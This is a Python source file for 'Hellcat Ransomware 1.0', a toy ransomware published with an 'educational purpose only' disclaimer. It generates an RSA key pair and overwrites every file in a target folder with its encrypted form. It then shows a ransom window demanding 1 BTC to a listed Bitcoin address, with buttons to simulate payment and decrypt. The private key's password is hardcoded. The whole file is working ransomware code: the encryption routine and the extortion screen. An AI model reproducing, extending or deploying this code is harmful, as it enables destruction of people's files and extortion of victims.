from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from colorama import Fore, Style
import os, sys
import tkinter as tk

# ------------------------------------------------ #
# Authors: @Kenoor & @Valmar
# Github : https://github.com/Hellcat-IV/Ransomware
# ------------------------------------------------ #

dir = os.path.dirname(os.path.realpath(__file__)) # get current directory

def print_banner():
    banner = """      __  __     ____           __     ____                                 
     / / / /__  / / /________ _/ /_   / __ \____ _____  _________  ____ ___ 
    / /_/ / _ \/ / / ___/ __ `/ __/  / /_/ / __ `/ __ \/ ___/ __ \/ __ `__ \\
   / __  /  __/ / / /__/ /_/ / /_   / _, _/ /_/ / / / (__  ) /_/ / / / / / /
  /_/ /_/\___/_/_/\___/\__,_/\__/  /_/ |_|\__,_/_/ /_/____/\____/_/ /_/ /_/ """
  
    info = """
  [+] Authors: @Kenoor & @Valmar
  [+] Github : https://github.com/Hellcat-IV/Ransomware """
  
    diclaimer = """
  [!] - This ransomware is for educational purpose only.
  [!] - We are not responsible for any damage caused by this ransomware. """
  
    log = """\n [x] -------------------------------------- [x]\n"""      
    
    print(Fore.GREEN + Style.BRIGHT + banner)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + info)
    print(Fore.RED + Style.BRIGHT + diclaimer)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + log)


def gen_key():
    try:
        privkey = open(f"{dir}/private.key","rb").read() # check if private key exist
        pubkey = open(f"{dir}/public.key","rb").read() # check if public key exist
        return privkey, pubkey
    
    except:
        print(Fore.RED + Style.BRIGHT + " [!] - No key found")
        pass
    
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) # generate private key
    print(Fore.GREEN + Style.BRIGHT + " [+] - Private key generated")
    
    with open(f"{dir}/private.key","wb") as f: # write private key to file
        k = priv.private_bytes(
            encoding=serialization.Encoding.PEM, 
            format=serialization.PrivateFormat.PKCS8, 
            encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword') 
        )
        privkey = k
        f.write(k)
        print(Fore.GREEN + Style.BRIGHT + " [+] - Private key saved in private.key")

    with open(f"{dir}/public.key","wb") as f: # write public key to file
        k = priv.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.PKCS1,
        )
        pubkey = k
        f.write(k)
        print(Fore.GREEN + Style.BRIGHT + " [+] - Public key saved in public.key")
   
    return privkey, pubkey


def encrypt(filename, public_key):
    public_key = serialization.load_pem_public_key(public_key)
    with open(f"{dir}/{filename}", "rb") as f: # read file to encrypt
        encrypted = public_key.encrypt(
            f.read(), 
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            ) 
        ) # encrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)

    with open(f"{dir}/{filename}", "wb") as f: # write encrypted file to disk
        f.write(encrypted)
  
        
def decrypt(filename, private_key):
    with open(f"{dir}/{filename}", "rb") as f: # read file to decrypt
        private_key = serialization.load_pem_private_key(
            private_key,
            password=b'mypassword', # password used to encrypt private key
        )
        decrypted = private_key.decrypt(
            f.read(), 
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            ) 
        ) # decrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)

    with open(f"{dir}/{filename}", "wb") as f: # write decrypted file to disk
        f.write(decrypted)
  
# ------------------------------------------------ #

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear") 
  
def get_tree_file():
    files = []
    for path, _, file_names in os.walk(f"exemple_dir"):
        for file_name in file_names:
            file_path = os.path.join(path, file_name)
            files.append(file_path)
    
    return files


def encrypt_all():
    privkey, pubkey = gen_key() # generate key pair
    
    for file in get_tree_file(): # encrypt all files in exemple_dir
        try:
            encrypt(file, pubkey)
        except Exception as e:
            print(Fore.RED + Style.BRIGHT + " [!] - Error: {}".format(e))
   
        
def decrypt_all():
    privkey, pubkey = gen_key() # generate key pair
    
    for file in get_tree_file(): # decrypt all files in exemple_dir
        try:
            decrypt(file, privkey)
        except Exception as e:
            print(Fore.RED + Style.BRIGHT + " [!] - Error: {}".format(e))

# ------------------------------------------------ #

def main():
    try:
        if sys.argv[1] == "-h":
            help_menu = """    Hellcat Ransomware 1.0
    Usage: python3 ransom.py [option]
    OPTIONS:
        -h      Show this help menu
        -a      All in one (encrypt + simulate payment + decrypt)
        -en     Encrypt all files in exemple_dir
        -de     Decrypt all files in exemple_dir
    EXAMPLES:
        python3 ransom.py -a"""
   
            clear()
            print(Fore.LIGHTWHITE_EX + Style.BRIGHT + help_menu)
        
        elif sys.argv[1] == "-en":
            encrypt_all()
            print(Fore.LIGHTRED_EX + Style.BRIGHT + " [+] - Files encrypted") 
        elif sys.argv[1] == "-de":
            decrypt_all()
            print(Fore.GREEN + Style.BRIGHT + " [+] - Files decrypted")
        elif sys.argv[1] == "-a":
            encrypt_all()
            print(Fore.LIGHTRED_EX + Style.BRIGHT + " [+] - Files encrypted")
            
            root = tk.Tk()
            root.title("Hellcat - Ransomware")
            root.geometry("1000x400")
            root.configure(bg="black")
            
            label = tk.Label(root, text="Your files have been encrypted", font=("Arial", 20), bg="black", fg="red")
            label.pack(pady=20)
            
            btc = tk.Label(root, text="Send 1 BTC to this address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2", font=("Arial", 20), bg="black", fg="red")
            btc.pack(pady=20)

            def simulate_payment():
                fake_payment.config(text="Transaction Complete !", bg="green", fg="white")
                print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + " [+] - Payment simulated")
                decrypt_btn.config(state="normal")              
                
            def simulate_decrypt():
                decrypt_btn.config(text="Decryption Complete !", bg="green", fg="white")
                print(Fore.GREEN + Style.BRIGHT + " [+] - Files decrypted")
                decrypt_all()
                root.after(3000, lambda: root.destroy())
                
            def close():
                root.destroy()
                
            fake_payment = tk.Button(root, text="Simulate Payment", font=("Arial", 20), bg="black", fg="red", command=simulate_payment)
            fake_payment.pack(pady=20)
            
            decrypt_btn = tk.Button(root, text="Decrypt files", font=("Arial", 20), bg="black", fg="red", command=simulate_decrypt, state="disabled")
            decrypt_btn.pack(pady=20)
            
            close_btn = tk.Button(root, text="Close", font=("Arial", 20), bg="black", fg="red", command=close)
            close_btn.pack(pady=20)
                
            root.mainloop()            
                                  
        else:
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + " [!] - Help: python3 ransom.py -h")
    
    except Exception as e:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + " [!] - Error: {}".format(e))
        print(Fore.LIGHTBLUE_EX + Style.BRIGHT + " [!] - Help: python3 ransom.py -h")

# ------------------------------------------------ #

if __name__ == "__main__":
    clear()
    print_banner()
    main()
        